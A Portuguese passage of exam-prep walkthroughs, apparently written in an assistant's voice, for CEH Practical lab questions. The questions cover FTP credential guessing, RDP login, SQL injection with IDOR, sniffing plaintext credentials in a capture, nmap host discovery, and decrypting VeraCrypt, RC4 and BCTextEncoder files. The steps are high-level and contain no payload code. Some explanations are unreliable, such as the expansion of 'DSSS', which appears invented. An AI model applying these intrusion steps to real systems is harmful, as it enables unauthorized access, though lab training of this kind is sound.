+Após descobrir as credenciais de FTP, utilize um cliente FTP (como ftp no Linux) para se conectar ao servidor e baixar o arquivo "flag.txt".
+o comando "get flag.txt" informado na imagem será usado quando já estiver conectado via FTP.
+Uma vez conectado, o comando "get flag.txt" irá fazer o download do arquivo para o computador que esta executando o comando.
+O conteúdo do arquivo "flag.txt" é a resposta para a questão.
+Considerações:
+As listas de nomes de usuário e senhas (Username.txt e Password.txt) devem conter nomes de usuário e senhas comuns ou relevantes para o ambiente do teste.
+O endereço IP 10.10.10.10 é um exemplo e pode variar na prova.
+É muito importante saber manusear comandos no terminal Linux, pois a prova prática do CEH requer conhecimento prático nessas ferramentas.
+É muito importante, ter listas de usuarios e senhas já configuradas no Kali linux, pois a prova não deixa os candidatos utilizarem ferramentas externas a maquina disponibilizada pela EC-council.
+Espero que esta explicação detalhada te ajude a entender como resolver essa questão! Se tiver mais alguma dúvida, pode perguntar.
+
+Com certeza! Vamos analisar essa questão da prova de CeH Practical passo a passo:
+Questão:
+"Um funcionário chamado John criptografou um contrato legal sensível e fez um backup dele. Ele então excluiu o arquivo criptografado, mas esqueceu de excluir o original. Ele armazenou o documento na área de trabalho do computador do escritório dele. John entrou em contato com você para acessar remotamente o computador do local de trabalho dele, excluir o arquivo e fornecer o número do documento que começa com "F/NXXXXXXXXXXXX". O nome do computador é "Server2019" e as credenciais de login são Nome de usuário: John; Senha: Secure123."
+Análise da Questão:
+O objetivo é acessar remotamente um computador Windows (Server2019) usando RDP (Remote Desktop Protocol).
+Localizar e excluir um arquivo específico na área de trabalho do usuário "John".
+Extrair um número de documento específico do arquivo.
+Resolução:
+Acesso Remoto via RDP:
+Utilize o cliente RDP (Remote Desktop Connection) no seu sistema (geralmente disponível no Windows e Linux).
+Insira o nome do computador "Server2019" ou o endereço IP correspondente.
+Utilize as credenciais fornecidas:
+Nome de usuário: John
+Senha: Secure123
+Conecte-se ao computador remoto.
+Localização e Exclusão do Arquivo:
+Navegue até a área de trabalho do usuário "John" no computador remoto.
+Procure o arquivo do contrato original (o arquivo não criptografado).
+Exclua o arquivo permanentemente.
+Extração do Número do Documento:
+Abra o arquivo do contrato original (se necessário, antes de excluí-lo).
+Localize o número do documento que começa com "F/NXXXXXXXXXXXX".
+Copie ou anote o número do documento.
+Resposta:
+A resposta para a questão é o número do documento "F/NXXXXXXXXXXXX".
+Considerações:
+A questão pressupõe que o RDP esteja habilitado no computador remoto.
+O nome do arquivo do contrato original não é especificado, então você precisará procurar por arquivos relevantes na área de trabalho do usuário "John".
+É crucial entender comandos do Windows caso necessário a navegação dentro de pastas via terminal.
+Espero que esta explicação detalhada te ajude a entender como resolver essa questão! Se tiver mais alguma dúvida, pode perguntar.
+
+Entendi, vamos analisar essa questão da prova de CeH Practical passo a passo:
+Questão:
+"Você é Cathie, um hacker ético trabalhando para uma produtora de filmes. Ao testar o website "www.moviescope.com" por vulnerabilidades, você encontrou uma vulnerabilidade de SQL injection. A informação do cookie está armazenada em um arquivo de texto na pasta Documentos da máquina "Ethical Hacker-2". Use o método de ataque SQL DSSS para capturar o link da sessão. Determine o número de contato de Kety associado ao website."
+Análise da Questão:
+O objetivo é explorar uma vulnerabilidade de SQL Injection para obter acesso à sessão de um usuário.
+A informação do cookie necessária para o ataque está em um arquivo de texto na máquina "Ethical Hacker-2".
+Após obter acesso à sessão, você precisa usar uma vulnerabilidade de IDOR (Insecure Direct Object Reference) para encontrar o número de contato de Kety.
+DSSS(Double SQL Syntax Structure), ou SQL Injection baseado em erros.
+Resolução:
+Obtenção do Cookie:
+Acesse a máquina "Ethical Hacker-2".
+Navegue até a pasta Documentos.
+Abra o arquivo de texto que contém a informação do cookie.
+Copie o valor do cookie.
+Ataque SQL Injection (DSSS):
+Utilize uma ferramenta como o Burp Suite ou SQLMap para explorar a vulnerabilidade de SQL Injection no website "www.moviescope.com".
+Use o valor do cookie obtido no passo anterior para autenticar a sua sessão.
+Como a dica aponta que o método é DSSS(Double SQL Syntax Structure), o mesmo tem como objetivo obter informações sobre o banco de dados explorando erros que o mesmo gera devido a consultas SQL mal formadas.
+O objetivo é obter o link da sessão de um usuário autenticado.
+Exploração de IDOR:
+Após obter acesso à sessão, procure por URLs ou parâmetros que permitem acessar informações de outros usuários.
+Modifique os parâmetros para acessar o perfil de Kety.
+Procure pelo número de contato de Kety no perfil dela.
+Resposta:
+A resposta para a questão é o número de contato de Kety.
+Considerações:
+A questão pressupõe que você tenha acesso à máquina "Ethical Hacker-2".
+Você precisa estar familiarizado com ferramentas de SQL Injection como Burp Suite ou SQLMap.
+O método DSSS requer conhecimento de sintaxe SQL e como explorar erros de banco de dados.
+É crucial entender o conceito de IDOR e como explorar essa vulnerabilidade.
+Espero que esta explicação detalhada te ajude a entender como resolver essa questão! Se tiver mais alguma dúvida, pode perguntar.
+
+Entendi, vamos analisar essa questão da prova de CeH Practical passo a passo:
+Questão:
+"Como parte de seu trabalho, Raven, um especialista em segurança de rede, foi encarregado de analisar um arquivo de captura de pacotes chamado Dos.pcapng, que foi armazenado na pasta Documentos da máquina Ethical Hacker-1. Ele foi instruído a determinar se alguma credencial de usuário associada ao website www.industry.com foi registrada em formato de texto simples. Após examinar o arquivo, Raven descobriu que o tráfego do site estava trafegando em texto simples e encontrou um nome de usuário e senha registrados em um dos pacotes. Forneça as credenciais encontradas no arquivo de captura no seguinte formato: Nome de usuário/Senha."
+Análise da Questão:
+O objetivo é analisar um arquivo de captura de pacotes (Dos.pcapng) para encontrar credenciais de login em texto simples.
+O arquivo de captura está localizado na pasta Documentos da máquina Ethical Hacker-1.
+O tráfego de interesse é relacionado ao website www.industry.com.
+A dica "http.request.method == POST" indica que as credenciais provavelmente foram enviadas usando o método HTTP POST.
+Resolução:
+Acesso ao Arquivo de Captura:
+Acesse a máquina Ethical Hacker-1.
+Navegue até a pasta Documentos.
+Localize o arquivo Dos.pcapng.
+Análise do Arquivo com Wireshark:
+Abra o arquivo Dos.pcapng com o Wireshark.
+Aplique o filtro http.request.method == POST para exibir apenas os pacotes HTTP POST. Isso ajudará a filtrar os pacotes onde possivelmente as credenciais foram enviadas.
+A dica"Watch Wireshark Section" diz ao candidato que todo o trabalho de análise será feito com o programa WireShark.
+Procure por pacotes HTTP POST que contenham dados de formulário relacionados ao website www.industry.com.
+Examine os dados dos pacotes para encontrar o nome de usuário e senha em texto simples. Os campos de nome de usuário e senha geralmente são denominados "username", "password", "login" ou similares.
+Formatação da Resposta:
+Após encontrar as credenciais, formate a resposta como "Nome de usuário/Senha".
+Considerações:
+É crucial ter conhecimento básico de análise de tráfego de rede e do uso do Wireshark.
+O filtro http.request.method == POST é fundamental para restringir a análise aos pacotes relevantes.
+Preste atenção aos dados dos pacotes HTTP POST, pois as credenciais podem estar em diferentes campos de formulário.
+Espero que esta explicação detalhada te ajude a entender como resolver essa questão! Se tiver mais alguma dúvida, pode perguntar.
+
+Certo, vamos analisar essa questão da prova de CeH Practical passo a passo:
+Questão:
+"Como um hacker ético trabalhando para uma produtora de filmes, você foi encarregado de testar o website "www.moviescope.com" por vulnerabilidades. Após conduzir seus testes, você descobriu que o website é vulnerável a ataques de injeção SQL. Para determinar o tipo de método HTTP que apresenta o maior risco para o website, você decide usar a ferramenta OWASP ZAP. A ferramenta irá ajudá-lo a identificar e explorar a vulnerabilidade de injeção SQL para determinar qual método HTTP apresenta o maior risco para o website."
+Análise da Questão:
+O objetivo é utilizar o OWASP ZAP para identificar e explorar uma vulnerabilidade de SQL Injection no website www.moviescope.com.
+Determinar qual método HTTP (GET ou POST) apresenta o maior risco em relação à vulnerabilidade de SQL Injection.
+Resolução:
+Configuração do OWASP ZAP:
+Inicie o OWASP ZAP.
+Configure o ZAP como um proxy para interceptar o tráfego HTTP entre o seu navegador e o website www.moviescope.com.
+Configure o navegador para utilizar o proxy do ZAP.
+Exploração da Vulnerabilidade SQL Injection:
+Navegue pelo website www.moviescope.com e procure por URLs ou parâmetros que possam ser vulneráveis a injeção SQL.
+Utilize as funcionalidades de "Active Scan" ou "Fuzzer" do OWASP ZAP para automatizar a identificação e exploração da vulnerabilidade.
+O ZAP irá enviar várias requisições HTTP (GET e POST) com payloads de injeção SQL para o website.
+Analise as respostas do servidor para identificar requisições que retornam erros de banco de dados ou dados inesperados.
+Determinação do Método HTTP de Maior Risco:
+Compare os resultados das requisições GET e POST.
+Verifique qual método HTTP permitiu explorar a vulnerabilidade de forma mais eficaz (por exemplo, retornando mais informações sensíveis do banco de dados).
+O método que permitiu explorar a vulnerabilidade com maior sucesso é o método de maior risco.
+Resposta:
+A resposta é o método HTTP (GET ou POST) que apresenta o maior risco.
+Considerações:
+É crucial ter conhecimento básico de SQL Injection e como explorar essa vulnerabilidade.
+O OWASP ZAP é uma ferramenta poderosa para testes de segurança web e requer familiaridade com suas funcionalidades.
+A dica "Watch The OWASP ZAP video in SQL Injection section" indica que o candidato deve consultar o vídeo fornecido para aprender a usar o ZAP para explorar SQL Injection.
+Espero que esta explicação detalhada te ajude a entender como resolver essa questão! Se tiver mais alguma dúvida, pode perguntar.
+
+Entendi, vamos analisar essa questão da prova de CeH Practical passo a passo:
+Questão:
+"Após escanear a rede, você, um hacker ético, descobriu que alguns hosts estão ativos. Identifique o número de hosts que estão ativos."
+"Observe os resultados da verificação de Q1 ou use este comando: nmap -sn 192.168.9.0/24 (pois isso verifica apenas se o host está ativo ou não)"
+"Seja qual for o número de hosts ativos, seja dois hosts, cinco ou seis hosts, sete, você terá a resposta."
+Análise da Questão:
+O objetivo é usar o Nmap para descobrir quais hosts estão ativos em uma determinada rede.
+O comando fornecido, nmap -sn 192.168.9.0/24, é projetado para fazer um "ping scan" e listar os hosts ativos.
+A dica informa que a resposta é um número que representa o número de hosts ativos.
+Resolução:
+Executar o comando Nmap:
+Abra um terminal na máquina Ethical Hacker-1 (supondo que seja onde você está trabalhando).
+Execute o comando: nmap -sn 192.168.9.0/24
+Interpretar os resultados:
+O Nmap retornará uma lista de hosts que estão ativos na rede 192.168.9.0/24.
+A resposta estará relacionada com a quantidade de hosts ativos, não seus ips, apenas a quantidade.
+Contar os hosts ativos:
+Conte o número de endereços IP relatados como ativos pelo Nmap.
+Fornecer a resposta:
+A resposta é o número de hosts ativos encontrados.
+Considerações:
+O comando nmap -sn realiza um "ping scan", que é uma maneira rápida de descobrir quais hosts estão ativos em uma rede.
+O intervalo de rede 192.168.9.0/24 cobre endereços IP de 192.168.9.1 a 192.168.9.254.
+Os resultados do Nmap mostrarão quantos desses endereços IP responderam ao ping.
+A dica "Look at the scan results of Q1" diz para o candidato que as vezes essa mesma análise já foi feita na questão 1 da prova.
+Espero que esta explicação detalhada te ajude a entender como resolver essa questão! Se tiver mais alguma dúvida, pode perguntar.
+
+Entendi, vamos analisar essa questão da prova de CeH Practical passo a passo:
+Questão:
+"Você está trabalhando como hacker ético em uma empresa onde um funcionário roubou segredos comerciais e os criptografou usando VeraCrypt. O arquivo de volume VeraCrypt chamado 'secret' está salvo na área de trabalho da máquina Ethical Hacker-1. A senha para o arquivo foi descoberta em um dos emails do funcionário durante uma investigação. Sua tarefa é descriptografar o arquivo usando a senha 'test' e identificar o código secreto contido nele."
+"Portanto, o nome do arquivo de volume do VeraCrypt chamado Secret é salvo no hacker ético."
+"Use Veracrypt (Watch Veracrypt Video in Cryptography Section)"
+Análise da Questão:
+O objetivo é descriptografar um arquivo VeraCrypt usando uma senha conhecida.
+O arquivo "secret" está localizado na área de trabalho da máquina Ethical Hacker-1.
+A senha para o arquivo é "test".
+"Use Veracrypt" e "Watch Veracrypt Video in Cryptography Section" diz ao canditado para utilizar o programa VeraCrypt e caso tenha dificuldades, assista ao vídeo disponibilizado no menu lateral do iLab.
+Resolução:
+Acesso ao arquivo VeraCrypt:
+Acesse a máquina Ethical Hacker-1.
+Navegue até a área de trabalho.
+Localize o arquivo "secret".
+Descriptografia do arquivo:
+Abra o VeraCrypt.
+Selecione "File" > "Select File..." e escolha o arquivo "secret".
+Clique em "Mount".
+Insira a senha "test" no campo de senha.
+Selecione um ponto de montagem (uma letra de unidade, por exemplo).
+Clique em "OK".
+Localização do código secreto:
+Após a montagem do volume, abra o ponto de montagem (a unidade que você selecionou).
+Procure pelo código secreto dentro dos arquivos descriptografados. O código pode estar em um arquivo de texto, imagem ou outro formato.
+Resposta:
+A resposta é o código secreto encontrado dentro do volume descriptografado.
+Considerações:
+É crucial ter o VeraCrypt instalado na máquina Ethical Hacker-1.
+Certifique-se de inserir a senha "test" corretamente.
+O código secreto pode estar escondido em diferentes tipos de arquivos dentro do volume VeraCrypt.
+Espero que esta explicação detalhada te ajude a entender como resolver essa questão! Se tiver mais alguma dúvida, pode perguntar.
+
+Entendi, vamos analisar essa questão da prova de CeH Practical passo a passo:
+Questão:
+"Como um hacker ético trabalhando com um banco, sua tarefa é descriptografar um arquivo cifrado chamado 'Cry-RC4-Accountno.hex' armazenado na pasta Documentos da máquina Ethical Hacker-1. O arquivo foi criptografado por um invasor que roubou o número da conta de um cliente do banco de dados do banco usando o CrypTool. Seu objetivo é determinar o número da conta descriptografando o arquivo, com uma dica para usar '14' como o valor da chave no comprimento da chave."
+Análise da Questão:
+O objetivo é descriptografar um arquivo criptografado usando RC4 com o CrypTool.
+O arquivo cifrado e o CrypTool estão disponíveis na máquina Ethical Hacker-1.
+A dica fornece o tamanho da chave (14) e sugere que este seja o valor da chave, sendo assim, a chave a ser usada será "14".
+Resolução:
+Abrir o CrypTool:
+Acesse a máquina Ethical Hacker-1 e abra o CrypTool.
+Carregar o arquivo cifrado:
+No CrypTool, vá em "File" -> "Open" e selecione o arquivo "Cry-RC4-Accountno.hex" da pasta Documentos.
+Selecionar o algoritmo de descriptografia:
+Vá em "Encrypt/Decrypt" -> "Symmetric (classic)" -> "RC4".
+Inserir a chave:
+No prompt de chave, insira "14" na caixa de texto.
+Garanta que Key length esteja em 8 bits como no exemplo da imagem.
+Descriptografar o arquivo:
+Clique em "Decrypt".
+Obter o número da conta:
+O CrypTool exibirá o conteúdo descriptografado, que deve conter o número da conta do cliente.
+Resposta:
+A resposta é o número da conta descriptografado.
+Considerações:
+O CrypTool é uma ferramenta de criptografia/descriptografia que precisa estar disponível na máquina Ethical Hacker-1.
+A dica "14" como o valor da chave no comprimento da chave é crucial para descriptografar corretamente o arquivo.
+A extensão .hex do arquivo significa que ele está em hexadecimal, então os dados serão exibidos em hexadecimal, para transforma-los em texto legível se necessário no CrypTool existe ferramentas para tal, caso contrario sites online podem fazer está transformação.
+Espero que esta explicação detalhada te ajude a entender como resolver essa questão! Se tiver mais alguma dúvida, pode perguntar.
+
+Entendi, vamos analisar essa questão da prova de CeH Practical passo a passo:
+Questão:
+"Uma empresa de gestão de ativos acabou de descobrir que um de seus corretores de bolsa obteve secretamente informações confidenciais de contas de negociação usando um aplicativo da empresa. O corretor de bolsa salvou essas informações no cartão SD de seu celular Android, e a empresa teme que ele possa vender essas informações para seus concorrentes. Como um hacker ético, você foi contratado para recuperar e excluir o arquivo do celular do corretor de bolsa. Forneça as informações da conta presentes no arquivo. Observe que apenas valores numéricos devem ser fornecidos no campo de resposta."
+"Observe que somente valores numéricos devem ser fornecidos no campo de resposta."
+"Watch the 'Hacking Android' section" diz ao candidato para ver a aba com o vídeo para consulta dentro do iLab.
+Análise da Questão:
+O objetivo é extrair informações numéricas sensíveis de um arquivo em um dispositivo Android.
+O arquivo está localizado no cartão SD do celular Android do corretor de bolsa.
+As informações a serem extraídas são exclusivamente valores numéricos.
+Resolução:
+Acesso ao dispositivo Android:
+Existem várias maneiras de acessar o dispositivo Android, dependendo das ferramentas disponíveis:
+ADB (Android Debug Bridge): Se o ADB estiver habilitado no dispositivo, você pode usar comandos ADB para acessar o sistema de arquivos do dispositivo.
+Ferramentas de forense móvel: Ferramentas como Autopsy ou Oxygen Forensic Suite podem ser usadas para extrair dados do dispositivo.
+Emulação: Se você tiver uma imagem do dispositivo, você pode usar um emulador Android para acessar o sistema de arquivos.
+Localização do arquivo:
+Navegue até o cartão SD do dispositivo e localize o arquivo que contém as informações sensíveis.
+Extração das informações numéricas:
+Abra o arquivo e examine o conteúdo.
+Extraia todos os valores numéricos presentes no arquivo.
+Ignore qualquer texto ou outros caracteres não numéricos.
+Formatação da resposta:
+Forneça os valores numéricos extraídos, separados por vírgulas, se houver vários valores.
+Considerações:
+O acesso ao dispositivo Android pode ser um desafio, dependendo das configurações do dispositivo e das ferramentas disponíveis.
+Ferramentas de forense móvel podem ser necessárias para extrair dados de dispositivos bloqueados ou criptografados.
+A questão especifica que apenas valores numéricos devem ser fornecidos na resposta.
+Espero que esta explicação detalhada te ajude a entender como resolver essa questão! Se tiver mais alguma dúvida, pode perguntar.
+
+Entendi, vamos analisar essa questão da prova de CeH Practical passo a passo:
+Questão:
+"Um invasor perigoso explorou uma vulnerabilidade em uma máquina em uma rede corporativa e codificou o endereço IP da máquina alvo. O arquivo codificado foi descoberto pelo vigilante administrador do banco de dados durante uma auditoria de rotina do banco de dados. Os dados codificados estão localizados no arquivo 'Encoded data.txt' na área de trabalho da máquina Ethical Hacker-1. Sua tarefa como hacker ético é decodificar o arquivo e extrair o endereço IP da máquina comprometida. A segurança de toda a rede corporativa depende do seu sucesso. (Senha: shadow123)"
+"Use BCTextEncoder (Or Watch its video)"
+Análise da Questão:
+O objetivo é decodificar um arquivo de dados codificado para extrair um endereço IP.
+O arquivo "Encoded data.txt" e a ferramenta BCTextEncoder estão localizados na máquina Ethical Hacker-1.
+A senha "shadow123" pode ser necessária para descriptografar o arquivo antes da decodificação ou ser necessário para decodificar o arquivo em si.
+Resolução:
+Acesso ao arquivo e ferramenta:
+Acesse a máquina Ethical Hacker-1.
+Navegue até a área de trabalho e localize o arquivo "Encoded data.txt" e a ferramenta BCTextEncoder.
+Decodificação do arquivo:
+Abra o BCTextEncoder.
+Carregue o arquivo "Encoded data.txt" no BCTextEncoder.
+Analise o BCTextEncoder, para verificar qual tipo de criptografia foi utilizada para a codificação do arquivo, por exemplo Base64, Hexadecimal, ASCII e etc.
+Utilize a senha "shadow123" caso seja necessário para a decodificação do arquivo, para o programa realizar a reversão da criptografia.
+Execute o processo de decodificação.
+Extração do endereço IP:
+Após a decodificação, examine o conteúdo do arquivo para encontrar o endereço IP.
+O endereço ip será o conjunto de números no formato ipv4, exemplo 192.168.0.1
+Resposta:
+A resposta é o endereço IP extraído do arquivo decodificado.
+Considerações:
+A ferramenta BCTextEncoder é crucial para decodificar o arquivo.
+A senha "shadow123" pode ser necessária para descriptografar o arquivo antes da decodificação.
+O arquivo decodificado pode conter outros dados além do endereço IP.
+Espero que esta explicação detalhada te ajude a entender como resolver essa questão! Se tiver mais alguma dúvida, pode perguntar.
